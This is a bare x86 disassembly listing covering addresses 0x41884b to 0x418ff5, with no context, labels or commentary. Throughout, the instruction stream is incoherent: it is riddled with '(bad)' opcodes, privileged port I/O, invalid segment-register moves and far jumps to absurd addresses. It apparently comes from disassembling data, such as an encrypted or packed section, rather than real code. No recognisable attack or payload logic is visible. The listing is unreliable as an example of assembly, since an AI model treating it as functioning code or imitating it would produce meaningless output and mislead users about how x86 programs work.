  41884b:	mov    DWORD PTR [eax],esp
  41884d:	cmp    al,0xdc
  41884f:	add    ecx,edx
  418851:	mov    eax,DWORD PTR [ebx+0x405d5e20]
  418857:	xchg   esp,eax
  418858:	pop    ecx
  418859:	cmp    DWORD PTR [edi+0x51],0xffffffc2
  41885d:	sub    BYTE PTR [ebx+0x8b5527],cl
  418863:	jbe    0x4188c6
  418865:	push   0x44
  418867:	jnp    0x418857
  418869:	fdivr  QWORD PTR [ebx]
  41886b:	xchg   esp,eax
  41886c:	add    DWORD PTR [ebp-0x224c140],eax
  418872:	je     0x4188d3
  418874:	xor    eax,0x355f74fd
  418879:	std    
  41887a:	je     0x4188db
  41887c:	xor    eax,0x362f74fd
  418881:	std    
  418882:	je     0x4188a3
  418884:	ss std 
  418886:	push   esp
  418887:	pop    ds
  418888:	ss jmp 0x5d0e10f3
  41888e:	and    al,0x47
  418890:	sbb    ecx,DWORD PTR [ecx+0x52da1f6c]
  418896:	mov    ebp,DWORD PTR [edi]
  418898:	sub    bl,BYTE PTR [eax*4-0x7ada8630]
  41889f:	mov    ebp,0x243b217a
  4188a4:	cmp    ch,BYTE PTR [edi+0x5]
  4188a7:	bound  esi,QWORD PTR [edi+0x3ef96bc0]
  4188ad:	jge    0x4188f4
  4188af:	jb     0x4188d9
  4188b1:	add    BYTE PTR [eax],al
  4188b3:	bound  esp,QWORD PTR [eax-0x2b]
  4188b6:	push   ebp
  4188b7:	in     eax,dx
  4188b8:	mov    ebx,esp
  4188ba:	daa    
  4188bb:	in     eax,0xef
  4188bd:	test   al,bh
  4188bf:	arpl   WORD PTR [ebp-0x4],bp
  4188c2:	xor    ah,cl
  4188c4:	cs dec ebp
  4188c6:	push   0x0
  4188c8:	(bad)  
  4188ca:	stos   DWORD PTR es:[edi],eax
  4188cb:	and    edx,DWORD PTR [edx+0x7623abdb]
  4188d1:	shr    DWORD PTR [ebx-0x2d9091dd],cl
  4188d7:	imul   esp,DWORD PTR [edx+0x43],0x656a23ab
  4188de:	iret   
  4188df:	mov    BYTE PTR [ebp-0x6a01f2d9],ch
  4188e5:	sub    bh,BYTE PTR [eax-0x10]
  4188e8:	jp     0x41893f
  4188ea:	call   0x3af80eeb
  4188ef:	pop    esi
  4188f0:	pop    ds
  4188f1:	test   ebx,0x37a056
  4188f7:	push   ebx
  4188f8:	fst    DWORD PTR [ebx]
  4188fa:	and    ah,0x6a
  4188fd:	mov    esi,0x8b12c18
  418902:	js     0x418977
  418904:	jb     0x418915
  418906:	js     0x418943
  418908:	out    dx,al
  418909:	fcmovnb st,st(0)
  41890b:	(bad)  
  41890c:	fidiv  WORD PTR [eax-0x4f]
  41890f:	add    eax,0xe0e1
  418914:	scas   eax,DWORD PTR es:[edi]
  418915:	dec    ecx
  418916:	sbb    BYTE PTR [eax],dh
  418918:	imul   ecx,edi,0x4e228423
  41891e:	adc    ebp,edi
  418920:	xchg   edi,eax
  418921:	fld    DWORD PTR ds:0x5ae19127
  418927:	mov    cl,0x71
  418929:	scas   eax,DWORD PTR es:[edi]
  41892a:	push   edx
  41892b:	mov    cl,0x0
  41892d:	pop    ecx
  41892e:	dec    eax
  41892f:	mov    ch,0xfb
  418931:	add    al,0x64
  418933:	jmp    0x7bfb:0x9d546203
  41893a:	icebp  
  41893b:	rol    BYTE PTR fs:[ecx-0x13],0x64
  418940:	cs push ecx
  418942:	in     eax,dx
  418943:	ret    
  418944:	int    0x4b
  418946:	fnstcw WORD PTR [ecx-0x4428eda]
  41894c:	ret    
  41894d:	lds    ebx,FWORD PTR [ebx+0x26]
  418950:	clc    
  418951:	in     al,0xcd
  418953:	int    0x13
  418955:	retf   
  418956:	xchg   ebp,eax
  418957:	xchg   ebx,eax
  418958:	shr    DWORD PTR [esi+0x220d95ee],cl
  41895e:	fldenv [esi+0x40]
  418961:	outs   dx,BYTE PTR ds:[esi]
  418962:	pop    esp
  418963:	data16 loopne 0x4189df
  418966:	fst    DWORD PTR [ebp-0x16]
  418969:	loop   0x418930
  41896b:	or     eax,0x16cd620c
  418970:	jmp    0x418990
  418972:	add    eax,0xa0eb013d
  418977:	dec    ebp
  418978:	sbb    esp,DWORD PTR [ebx+0x54]
  41897b:	sub    esi,DWORD PTR [ebp+edi*8+0x203e9d8]
  418982:	dec    eax
  418983:	push   ds
  418984:	loopne 0x4189fb
  418986:	dec    eax
  418987:	push   ss
  418988:	loopne 0x4189f7
  41898a:	dec    eax
  41898b:	sbb    eax,0x672946f8
  418990:	sub    eax,DWORD PTR [eax]
  418992:	cmp    eax,0xbe82f2cd
  418997:	std    
  418998:	loope  0x41899d
  41899a:	jecxz  0x418958
  41899c:	add    ch,cl
  41899e:	pop    ebp
  41899f:	fnstcw WORD PTR [edi+0x5]
  4189a2:	add    ch,al
  4189a4:	add    BYTE PTR [esi-0x2e],ah
  4189a7:	jecxz  0x418936
  4189a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189aa:	sub    eax,0x25ddfbec
  4189af:	clc    
  4189b0:	sti    
  4189b1:	aad    0x1d
  4189b3:	clc    
  4189b4:	sti    
  4189b5:	mov    ebp,0xe966f815
  4189ba:	retf   
  4189bb:	inc    edi
  4189bc:	dec    esp
  4189bd:	ss mov dl,0xd3
  4189c0:	dec    edi
  4189c1:	cwde   
  4189c2:	pop    eax
  4189c3:	push   ss
  4189c4:	jmp    0xfc8814a9
  4189c9:	jb     0x41895c
  4189cb:	xor    eax,ecx
  4189cd:	sar    DWORD PTR [esi+eax*2-0x78],cl
  4189d1:	daa    
  4189d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189d4:	push   edi
  4189d5:	jb     0x418959
  4189d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189d8:	mov    esi,0x87ac61e1
  4189dd:	add    eax,0x4818cc7c
  4189e2:	in     eax,0xb1
  4189e4:	inc    esp
  4189e5:	jmp    0xde565628
  4189ea:	mov    ebp,0x8a5cfbd7
  4189ef:	inc    esp
  4189f0:	jbe    0x4189d3
  4189f2:	inc    esi
  4189f3:	leave  
  4189f4:	xor    al,0xd1
  4189f6:	add    dl,bl
  4189f8:	inc    ebp
  4189f9:	cld    
  4189fa:	mov    esi,0xe91519a5
  4189ff:	xchg   esp,eax
  418a00:	push   eax
  418a01:	in     eax,dx
  418a02:	scas   al,BYTE PTR es:[edi]
  418a03:	or     eax,0xfb85a1ef
  418a08:	call   0x1cfb:0xeafd9e00
  418a0f:	outs   dx,BYTE PTR ds:[esi]
  418a10:	inc    esp
  418a11:	jbe    0x4189f0
  418a13:	xchg   dl,cl
  418a15:	or     BYTE PTR [eax],al
  418a17:	fmul   QWORD PTR [ebp-0x8d17cc]
  418a1d:	std    
  418a1e:	dec    DWORD PTR [esi-0x65]
  418a21:	adc    al,0x0
  418a23:	jbe    0x4189e5
  418a25:	in     al,dx
  418a26:	push   DWORD PTR [esi]
  418a28:	rcr    DWORD PTR [ebx-0x378cf64],cl
  418a2e:	(bad)  
  418a2f:	xlat   BYTE PTR es:[ebx]
  418a31:	std    
  418a32:	jne    0x418a2f
  418a34:	std    
  418a35:	outs   dx,DWORD PTR ds:[esi]
  418a36:	or     al,0x9c
  418a38:	jbe    0x418a3e
  418a3a:	jmp    FWORD PTR [ebx+0x2dbbe43e]
  418a40:	cld    
  418a41:	std    
  418a42:	pop    ebp
  418a43:	mov    ecx,ebp
  418a45:	add    BYTE PTR [ebp+0x50],dl
  418a48:	loope  0x418a47
  418a4a:	jne    0x418aaf
  418a4c:	mov    edx,0xdaf76b9c
  418a51:	std    
  418a52:	jne    0x418a0b
  418a54:	std    
  418a55:	outs   dx,DWORD PTR ds:[esi]
  418a56:	adc    BYTE PTR [esi+esi*2+0x8],bl
  418a5a:	inc    DWORD PTR [eax]
  418a5c:	ss inc edx
  418a5e:	std    
  418a5f:	jo     0x418a5c
  418a61:	loop   0x4189fb
  418a63:	dec    BYTE PTR [ebp+edi*8-0x25683da9]
  418a6a:	dec    edi
  418a6b:	mov    ebx,DWORD PTR [edi-0x7071aa7]
  418a71:	in     eax,dx
  418a72:	xor    al,0x53
  418a74:	xor    eax,0x109c2fc0
  418a79:	sbb    esp,edi
  418a7b:	push   esi
  418a7c:	push   0x72cfe891
  418a81:	std    
  418a82:	std    
  418a83:	test   BYTE PTR [ebx],cl
  418a85:	ja     0x418a97
  418a87:	push   DWORD PTR [esi-0x2b]
  418a8a:	std    
  418a8b:	jne    0x418ae4
  418a8d:	std    
  418a8e:	outs   dx,DWORD PTR ds:[esi]
  418a8f:	adc    BYTE PTR [edx+0x6f],ah
  418a92:	stos   DWORD PTR es:[edi],eax
  418a93:	or     edi,DWORD PTR ds:0x7ce6c10e
  418a99:	xor    DWORD PTR [eax],eax
  418a9b:	add    cl,bl
  418a9d:	inc    esp
  418a9e:	hlt    
  418a9f:	mov    DWORD PTR [esi+0x63b2f514],edx
  418aa5:	mov    edx,0xd4868850
  418aaa:	xrelease xchg DWORD PTR [esi-0x33f30d24],esi
  418ab1:	icebp  
  418ab2:	jbe    0x418af8
  418ab4:	inc    esi
  418ab5:	dec    esp
  418ab6:	fld    st(0)
  418ab8:	outs   dx,BYTE PTR ds:[esi]
  418ab9:	test   BYTE PTR [eax-0x27d5ce8e],bh
  418abf:	mov    al,BYTE PTR [eax]
  418ac1:	sahf   
  418ac2:	aam    0x8
  418ac4:	push   ecx
  418ac5:	xor    dh,bh
  418ac7:	or     ah,BYTE PTR [esp+ebp*2+0x70]
  418acb:	add    BYTE PTR [ecx+0x447333a6],al
  418ad1:	jle    0x418b12
  418ad3:	ror    BYTE PTR [edx+0x4fec1c26],1
  418ad9:	out    0x73,eax
  418adb:	fdiv   QWORD PTR [ebx]
  418add:	adc    ch,BYTE PTR [edi-0x31]
  418ae0:	mov    BYTE PTR [edi+edx*8+0x369df999],dl
  418ae7:	jns    0x418ab1
  418ae9:	call   0xd84c7399
  418aee:	or     ebp,ecx
  418af0:	or     eax,0x649978de
  418af5:	ins    DWORD PTR es:[edi],dx
  418af6:	outs   dx,BYTE PTR ds:[esi]
  418af7:	dec    edx
  418af8:	dec    eax
  418af9:	jmp    0x418aee
  418afb:	call   0xe93d640f
  418b00:	adc    ebp,DWORD PTR [ecx]
  418b02:	hlt    
  418b03:	call   0x807f6217
  418b08:	mul    DWORD PTR [eax-0x27]
  418b0b:	sbb    eax,0xe942cdb4
  418b10:	adc    bl,dh
  418b12:	jl     0x418afe
  418b14:	add    esp,DWORD PTR [edx+0x0]
  418b17:	es call 0x842e5982
  418b1d:	xor    eax,0x27daf5d9
  418b22:	sbb    BYTE PTR [edx-0x48],ah
  418b25:	add    BYTE PTR [ecx-0x2d],al
  418b28:	scas   eax,DWORD PTR es:[edi]
  418b29:	cmp    BYTE PTR [eax+0x6291515b],dl
  418b2f:	fldl2t 
  418b31:	nop
  418b32:	sahf   
  418b33:	std    
  418b34:	loop   0x418ae9
  418b36:	dec    dh
  418b38:	cmc    
  418b39:	and    dh,BYTE PTR [ecx-0x17]
  418b3c:	call   0xeca6:0x5213dab4
  418b43:	inc    esp
  418b44:	xor    ecx,DWORD PTR [esi-0x1871fe56]
  418b4a:	data16 int 0x83
  418b4d:	mov    ?,WORD PTR [esi]
  418b4f:	std    
  418b50:	in     al,dx
  418b51:	and    DWORD PTR [ecx+0x68e78651],esp
  418b57:	xor    BYTE PTR [edi+edx*8-0x66],dh
  418b5b:	cwde   
  418b5c:	push   cs
  418b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b5e:	sub    eax,0x1998e93f
  418b63:	add    DWORD PTR [esi-0x5c329119],edx
  418b69:	mov    dh,0x32
  418b6b:	lods   al,BYTE PTR ds:[esi]
  418b6c:	dec    edi
  418b6d:	add    eax,0xbf7113db
  418b72:	inc    ecx
  418b73:	stc    
  418b74:	ror    DWORD PTR [ebp-0x77162666],0xa2
  418b7b:	int    0xd8
  418b7d:	mov    ds,edx
  418b7f:	shr    eax,0x3
  418b82:	bound  edx,QWORD PTR [edx+0x1]
  418b85:	and    eax,0xa187d44a
  418b8a:	add    BYTE PTR [ecx-0x7f59d103],cl
  418b90:	inc    esi
  418b91:	jne    0x418b58
  418b93:	push   ecx
  418b94:	push   ecx
  418b95:	inc    ebp
  418b96:	int    0x15
  418b98:	test   eax,0x4a2589
  418b9d:	push   eax
  418b9e:	je     0x418bc5
  418ba0:	clc    
  418ba1:	and    al,0x19
  418ba3:	jmp    0xe0ed0c4
  418ba8:	cld    
  418ba9:	add    cl,ch
  418bab:	popa   
  418bac:	inc    esi
  418bad:	push   ebx
  418bae:	and    eax,0xd4fbd03d
  418bb3:	or     DWORD PTR [ebp+0x76],eax
  418bb6:	std    
  418bb7:	inc    eax
  418bb8:	enter  0xb610,0x40
  418bbc:	stos   DWORD PTR es:[edi],eax
  418bbd:	inc    esp
  418bbe:	jb     0x418be9
  418bc0:	xor    esp,ebx
  418bc2:	add    DWORD PTR [ecx+0x46],eax
  418bc5:	mov    BYTE PTR [edx],ch
  418bc7:	mov    al,ds:0x8a6257a5
  418bcc:	mov    al,ds:0x4661fdbe
  418bd1:	jne    0x418b98
  418bd3:	rol    DWORD PTR [ebp+esi*2-0x33],1
  418bd7:	mov    cl,0x44
  418bd9:	jne    0x418ba0
  418bdb:	mov    cl,0x44
  418bdd:	jne    0x418bac
  418bdf:	mov    cl,0x92
  418be1:	call   0xfc880f59
  418be6:	sub    edx,DWORD PTR [ecx-0x3367aebd]
  418bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bed:	push   ebx
  418bee:	push   ebx
  418bef:	add    BYTE PTR [ecx-0x6c],ah
  418bf2:	xchg   DWORD PTR [eax-0xedb6b2b],ebp
  418bf8:	mov    al,0xb1
  418bfa:	and    DWORD PTR [edx],ebx
  418bfc:	inc    ebp
  418bfd:	test   al,0xfb
  418bff:	add    BYTE PTR [edi],ch
  418c01:	xor    DWORD PTR [ecx+ecx*4],ebp
  418c04:	aas    
  418c05:	xor    DWORD PTR [eax],esp
  418c07:	push   ecx
  418c08:	rcl    BYTE PTR [ebp-0x28bf4218],0x0
  418c0f:	mov    esp,DWORD PTR [edi+0x38b1c31]
  418c15:	pop    ebx
  418c16:	(bad)  
  418c17:	je     0x418c53
  418c19:	jno    0x418c4e
  418c1b:	das    
  418c1c:	dec    edi
  418c1d:	jmp    0x5681001f
  418c22:	adc    cl,BYTE PTR [ebx-0x56020a0c]
  418c28:	xchg   esp,eax
  418c29:	clc    
  418c2a:	mov    DWORD PTR [edi+ebx*1+0x3b],eax
  418c2e:	dec    edi
  418c2f:	jmp    FWORD PTR [ebx]
  418c31:	ror    DWORD PTR [ecx-0x3cd1ecb0],cl
  418c37:	call   0x3d9910
  418c3c:	xor    ch,0x7f
  418c3f:	in     eax,dx
  418c40:	scas   eax,DWORD PTR es:[edi]
  418c41:	jnp    0x418bf6
  418c43:	add    BYTE PTR [ebx-0x23],bl
  418c46:	add    BYTE PTR [esi+0x42],dl
  418c49:	sub    DWORD PTR [eax],esp
  418c4b:	and    BYTE PTR [ebx],ah
  418c4d:	sbb    eax,0x55bb018d
  418c52:	icebp  
  418c53:	test   DWORD PTR [eax],eax
  418c55:	ins    DWORD PTR es:[edi],dx
  418c56:	popa   
  418c57:	inc    esp
  418c58:	lea    ecx,[edi]
  418c5a:	cmp    ebx,DWORD PTR [eax+edx*2]
  418c5d:	inc    eax
  418c5e:	adc    DWORD PTR [eax],esp
  418c60:	adc    al,0xcd
  418c62:	mov    eax,ebp
  418c64:	push   es
  418c65:	retf   
  418c66:	(bad)  
  418c67:	add    BYTE PTR [eax],al
  418c69:	xchg   esp,eax
  418c6a:	xchg   BYTE PTR [eax-0x7d],dh
  418c6d:	xchg   ebx,eax
  418c6e:	xlat   BYTE PTR ds:[ebx]
  418c6f:	outs   dx,DWORD PTR ds:[esi]
  418c70:	sub    BYTE PTR [eax],dl
  418c72:	add    BYTE PTR [eax*4+0x331b6ac9],0x62
  418c7a:	jo     0x418c26
  418c7c:	ss pusha 
  418c7e:	lods   al,BYTE PTR ds:[esi]
  418c7f:	cli    
  418c80:	imul   ebp,DWORD PTR [ebp-0x39],0x7519e850
  418c87:	add    BYTE PTR [eax],al
  418c89:	out    0x6f,eax
  418c8b:	xchg   esp,eax
  418c8c:	or     dl,BYTE PTR [ebp-0x1]
  418c8f:	or     BYTE PTR [ecx+0x7d1c771],cl
  418c95:	cmp    al,cl
  418c97:	data16 std 
  418c99:	cmp    eax,0x56e851b7
  418c9e:	mov    ds:0x8cd9fffe,eax
  418ca3:	sub    BYTE PTR [ebx],dl
  418ca5:	aad    0x30
  418ca7:	add    BYTE PTR [esi-0x17],bl
  418caa:	jp     0x418cd4
  418cac:	or     esp,ebp
  418cae:	xor    BYTE PTR [eax],al
  418cb0:	pop    ebp
  418cb1:	scas   eax,DWORD PTR es:[edi]
  418cb2:	pop    ss
  418cb3:	mov    bh,0x56
  418cb5:	and    BYTE PTR [eax+0x0],al
  418cb8:	push   ebx
  418cb9:	add    cl,ch
  418cbb:	fwait
  418cbc:	test   ah,ah
  418cbe:	cli    
  418cbf:	scas   al,BYTE PTR es:[edi]
  418cc0:	sub    esp,DWORD PTR [ecx+ebx*8]
  418cc3:	lock xchg BYTE PTR [esi+edi*1+0x3c],al
  418cc8:	lea    eax,[eax+0x2e]
  418ccb:	mov    ecx,0xb76623c3
  418cd0:	ret    0x3117
  418cd3:	mov    edi,0x1eaf2c43
  418cd9:	or     BYTE PTR ds:0xe71b9ab7,dl
  418cdf:	pop    edi
  418ce0:	add    al,0x8a
  418ce2:	daa    
  418ce3:	and    BYTE PTR [edi-0x74d381b4],al
  418ce9:	pop    ebp
  418cea:	adc    dh,BYTE PTR [edi+edi*1-0x5e50928c]
  418cf1:	pop    ss
  418cf2:	(bad)  
  418cf3:	fstp   DWORD PTR [ebp-0x59]
  418cf6:	xchg   dl,cl
  418cf8:	add    DWORD PTR [ebx-0x7a3be55],ecx
  418cfe:	jge    0x418d49
  418d00:	clc    
  418d01:	add    DWORD PTR [edx+0x5c],esp
  418d04:	stos   BYTE PTR es:[edi],al
  418d05:	cwde   
  418d06:	sbb    BYTE PTR [ecx],dh
  418d08:	sbb    bh,dl
  418d0a:	pop    esi
  418d0b:	inc    ecx
  418d0c:	pop    edi
  418d0d:	shr    DWORD PTR [ebp+0x53],1
  418d10:	xchg   edx,eax
  418d11:	sub    al,0x5f
  418d13:	retf   0x3e9
  418d16:	mov    eax,0x81989ad9
  418d1b:	loope  0x418d81
  418d1d:	mov    BYTE PTR [eax],0x4d
  418d20:	test   eax,0xc82ed48a
  418d25:	fnsave [ebp+0x1eedc726]
  418d2b:	xchg   esi,eax
  418d2c:	cmc    
  418d2d:	mov    ebp,0xc58deab4
  418d32:	xlat   BYTE PTR ds:[ebx]
  418d33:	add    eax,0x6203e8a6
  418d38:	push   edx
  418d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d3a:	out    0x59,eax
  418d3c:	push   ebp
  418d3d:	das    
  418d3e:	cwde   
  418d3f:	pop    esp
  418d40:	xor    esp,eax
  418d42:	(bad)  
  418d43:	out    dx,al
  418d44:	inc    eax
  418d45:	outs   dx,DWORD PTR ds:[esi]
  418d46:	enter  0xdd41,0x64
  418d4a:	inc    esp
  418d4b:	outs   dx,DWORD PTR ds:[esi]
  418d4c:	push   ebp
  418d4d:	addr16 add al,0x62
  418d50:	fnstcw WORD PTR [ecx+0x5]
  418d53:	mov    ebx,0xba4b6f66
  418d58:	mov    bl,0xf6
  418d5a:	add    DWORD PTR [edx+0x34],esp
  418d5d:	test   BYTE PTR [esi],bl
  418d5f:	out    dx,eax
  418d60:	jne    0x418d4c
  418d62:	add    esp,DWORD PTR [edx+0x54]
  418d65:	mov    ch,0xf7
  418d67:	mov    ebp,0x620377a3
  418d6c:	mov    cl,0x0
  418d6e:	jmp    0x5d3dce04
  418d73:	mov    dl,0xfc
  418d75:	and    al,0x72
  418d77:	jno    0x418d8f
  418d79:	test   BYTE PTR [ebp+0x61],ch
  418d7c:	fld    DWORD PTR [eax]
  418d7e:	in     eax,dx
  418d7f:	popa   
  418d80:	fld    DWORD PTR [eax]
  418d82:	rol    DWORD PTR [eax],0x90
  418d85:	jmp    0xf75:0x47dae8fe
  418d8c:	repz xchg esp,eax
  418d8e:	and    al,0xe6
  418d90:	adc    DWORD PTR [ecx-0x3e],edx
  418d93:	sbb    DWORD PTR [ecx],edx
  418d95:	push   ecx
  418d96:	retf   
  418d97:	xchg   ecx,eax
  418d98:	push   0xe5e900a5
  418d9d:	sbb    BYTE PTR [ebp-0xd],dh
  418da0:	loope  0x418d5e
  418da2:	and    al,0xde
  418da4:	popa   
  418da5:	lds    ecx,FWORD PTR [edi]
  418da7:	pop    ds
  418da8:	rcl    DWORD PTR [esp+0x763cd1c5],cl
  418daf:	in     eax,0xce
  418db1:	push   eax
  418db2:	dec    ebp
  418db3:	lds    eax,FWORD PTR [ecx]
  418db5:	cmp    BYTE PTR [ecx],bh
  418db7:	fs mov BYTE PTR ds:[di-0x1ffb],ch
  418dbe:	call   0xfc816019
  418dc3:	bound  ebx,QWORD PTR [ecx+esi*1-0x269ea85c]
  418dca:	test   BYTE PTR [ecx],ch
  418dcc:	cli    
  418dcd:	call   0xecb66f38
  418dd2:	dec    eax
  418dd3:	(bad)  [ecx+0x429323f]
  418dd9:	sahf   
  418dda:	push   edi
  418ddb:	jb     0x418d67
  418ddd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dde:	mov    esi,0x28961f1
  418de3:	add    dl,BYTE PTR [eax+0x5a]
  418de6:	in     eax,dx
  418de7:	add    BYTE PTR [eax],al
  418de9:	scas   eax,DWORD PTR es:[edi]
  418dea:	mov    dl,BYTE PTR [esi+0x57]
  418ded:	icebp  
  418dee:	xlat   BYTE PTR ds:[ebx]
  418def:	pop    ebp
  418df0:	push   0xffffff8b
  418df2:	push   0x8bab2445
  418df7:	xchg   DWORD PTR [edi+edx*2-0x27],eax
  418dfb:	push   eax
  418dfc:	push   0x2000db78
  418e01:	mov    WORD PTR [eax+0x20],fs
  418e04:	xor    BYTE PTR [eax],al
  418e06:	in     al,dx
  418e07:	cmp    DWORD PTR [edi+edx*2+0x35],0xfffffffd
  418e0c:	push   esi
  418e0d:	sub    DWORD PTR [eax],0xffffffd9
  418e10:	inc    ebx
  418e11:	push   eax
  418e12:	call   0xc20:0x5f52706f
  418e19:	data16 jae 0x418e6b
  418e1c:	push   0x4b
  418e1e:	mov    WORD PTR [edi+0x4c3f2744],es
  418e24:	push   ebx
  418e25:	push   0x232474dc
  418e2a:	mov    WORD PTR [ecx+0x3b8f3ce],cs
  418e30:	add    BYTE PTR [ebx],cl
  418e32:	push   edx
  418e33:	jge    0x418e59
  418e35:	aaa    
  418e36:	push   edx
  418e37:	jmp    0x4bc6c96f
  418e3c:	test   DWORD PTR [esi+0x7ef844cc],ebp
  418e42:	adc    DWORD PTR [eax],esp
  418e44:	sbb    al,0xab
  418e46:	jo     0x418e5f
  418e48:	push   ebx
  418e49:	pushf  
  418e4a:	popa   
  418e4b:	and    BYTE PTR [eax],bh
  418e4d:	add    dl,bh
  418e4f:	push   ecx
  418e50:	retf   
  418e51:	call   0x4260a1
  418e56:	inc    eax
  418e57:	sub    DWORD PTR [eax],esp
  418e59:	adc    al,0x50
  418e5b:	in     eax,0x31
  418e5d:	rol    BYTE PTR [esi-0x19],0xd
  418e61:	inc    esp
  418e62:	(bad)  
  418e63:	clc    
  418e64:	scas   eax,DWORD PTR es:[edi]
  418e65:	push   ebp
  418e66:	adc    eax,0x1688af85
  418e6b:	or     al,0xdc
  418e6d:	out    0xfc,eax
  418e6f:	arpl   WORD PTR [eax],ax
  418e71:	add    cl,ch
  418e73:	cmc    
  418e74:	xchg   al,bl
  418e76:	jp     0x418ef3
  418e78:	mov    edi,edi
  418e7a:	test   ebx,ecx
  418e7c:	dec    ebp
  418e7d:	call   0x403ba8
  418e82:	call   0x612a49fa
  418e87:	loop   0x418ecd
  418e89:	pop    ebp
  418e8a:	add    al,0xfb
  418e8c:	add    esp,0xc726e
  418e92:	scas   eax,DWORD PTR es:[edi]
  418e93:	mov    ebx,0x1ca7892b
  418e98:	fnstcw WORD PTR [esi]
  418e9a:	call   0x1d10:0xb7fd09dd
  418ea1:	jae    0x418ef9
  418ea3:	addr16 xchg ebx,eax
  418ea5:	pop    ss
  418ea6:	cmp    DWORD PTR [ebx+0x1d],eax
  418ea9:	jae    0x418f25
  418eab:	push   edi
  418eac:	xchg   ebx,eax
  418ead:	and    ebx,DWORD PTR [ecx-0xf]
  418eb0:	mov    eax,0xc75f0072
  418eb5:	xchg   edx,eax
  418eb6:	pop    ds
  418eb7:	stc    
  418eb8:	xor    bl,BYTE PTR ds:0x92b76e73
  418ebe:	paddw  mm7,mm7
  418ec1:	mov    edx,0x81303ec1
  418ec6:	in     al,dx
  418ec7:	inc    edx
  418ec8:	test   DWORD PTR [ecx-0x3bd539d5],ecx
  418ece:	inc    ebp
  418ed0:	mov    eax,ds:0xabd5fcd2
  418ed5:	aas    
  418ed6:	jae    0x418f57
  418ed8:	out    dx,eax
  418ed9:	xchg   ebx,eax
  418eda:	and    ebx,DWORD PTR [edx]
  418edc:	fldenv [edx]
  418ede:	xchg   edi,eax
  418edf:	adc    DWORD PTR [ecx-0x6e7e68e6],0x91819712
  418ee9:	or     dl,BYTE PTR [edi-0x68fd6e7f]
  418eef:	inc    ecx
  418ef0:	xchg   ecx,eax
  418ef1:	cli    
  418ef2:	xchg   esi,eax
  418ef3:	inc    ecx
  418ef4:	xchg   ecx,eax
  418ef5:	repnz xchg esi,eax
  418ef7:	inc    ecx
  418ef8:	xchg   ecx,eax
  418ef9:	cwde   
  418efa:	mov    BYTE PTR [ecx+0x7f1b7730],bl
  418f00:	cmp    eax,0xd96255d1
  418f05:	jmp    0x16e7a6c0
  418f0a:	adc    cl,BYTE PTR [edi+eiz*4]
  418f0d:	ret    0x8190
  418f10:	xchg   ebp,eax
  418f11:	outs   dx,BYTE PTR ds:[esi]
  418f12:	dec    ecx
  418f13:	enter  0xc1da,0x1e
  418f17:	add    BYTE PTR [esi],dh
  418f19:	fucompp 
  418f1b:	mov    cs,WORD PTR [edx+0x57]
  418f1e:	mov    ds:0x7b4ec290,eax
  418f23:	test   BYTE PTR ds:0x1f8eea3d,dh
  418f29:	cmp    eax,0xd9626057
  418f2e:	jmp    0xea0b8a5e
  418f33:	add    ebx,ebp
  418f35:	xchg   ebp,eax
  418f36:	int    0xf3
  418f38:	loopne 0x418f53
  418f3a:	cmc    
  418f3b:	or     bl,bl
  418f3d:	or     al,0x52
  418f3f:	test   DWORD PTR [esp+edi*1+0x5b],ecx
  418f43:	(bad)  
  418f44:	sahf   
  418f45:	cmc    
  418f46:	stc    
  418f47:	mov    gs,esp
  418f49:	push   esi
  418f4a:	dec    ebx
  418f4b:	nop
  418f4c:	cs pop eax
  418f4e:	jg     0x418ed8
  418f50:	(bad)  
  418f51:	fldl2t 
  418f53:	add    al,0x48
  418f55:	xlat   BYTE PTR ds:[ebx]
  418f56:	add    BYTE PTR [ebx+0x2e50b3f2],dl
  418f5c:	repnz clc 
  418f5e:	inc    eax
  418f5f:	jo     0x418f96
  418f61:	dec    ebp
  418f62:	add    ecx,ebp
  418f64:	popa   
  418f65:	mov    WORD PTR [edi-0x4a681dc],es
  418f6b:	push   cs
  418f6c:	dec    ecx
  418f6d:	push   ebp
  418f6e:	sar    DWORD PTR [eax+ebp*4+0x3d],0xb0
  418f73:	inc    ebp
  418f74:	pop    esi
  418f75:	fld    DWORD PTR [eax]
  418f77:	bound  ebx,QWORD PTR [ecx]
  418f79:	xor    DWORD PTR [eax-0x269eff87],eax
  418f7f:	xchg   DWORD PTR [esi-0x21d566b7],esi
  418f85:	pop    eax
  418f86:	ds jne 0x418f96
  418f89:	mov    dl,0x3d
  418f8b:	jne    0x418f92
  418f8d:	mov    dl,0x3d
  418f8f:	jne    0x418f9e
  418f91:	adc    bh,BYTE PTR ds:0x3d120575
  418f97:	jne    0x418fa6
  418f99:	adc    bh,BYTE PTR ds:0x3d120575
  418f9f:	jne    0x418f6e
  418fa1:	or     eax,0x5c5753d
  418fa6:	mov    eax,DWORD PTR [edi-0x4cb865c]
  418fac:	mov    cs,WORD PTR [eax+0x52]
  418faf:	icebp  
  418fb0:	xchg   ecx,eax
  418fb1:	data16 or ah,bh
  418fb4:	jle    0x418f8e
  418fb6:	push   eax
  418fb7:	ret    
  418fb8:	pop    ss
  418fb9:	int    0x9e
  418fbb:	jg     0x418f62
  418fbd:	add    DWORD PTR [edx],ebx
  418fbf:	and    eax,0x56d9cfe9
  418fc4:	jb     0x418fe3
  418fc6:	clc    
  418fc7:	adc    BYTE PTR [ecx-0xb],al
  418fca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fcb:	add    cl,ch
  418fcd:	loop   0x418fe7
  418fcf:	jne    0x418fd1
  418fd1:	sti    
  418fd2:	sbb    al,0x6b
  418fd4:	push   esp
  418fd5:	les    edi,FWORD PTR [ebx-0x2844febc]
  418fdb:	xchg   DWORD PTR [edi+ebx*2+0x49],eax
  418fdf:	dec    esp
  418fe0:	lea    eax,[eax]
  418fe2:	nop    DWORD PTR [eax]
  418fe5:	push   eax
  418fe6:	shl    DWORD PTR [eax],1
  418fe8:	std    
  418fe9:	je     0x418f8a
  418feb:	jae    0xc5712f65
  418ff1:	inc    esp
  418ff2:	scas   eax,DWORD PTR es:[edi]
  418ff3:	sbb    eax,DWORD PTR [eax]
  418ff5:	add    BYTE PTR [ebx-0x24aa0229],cl
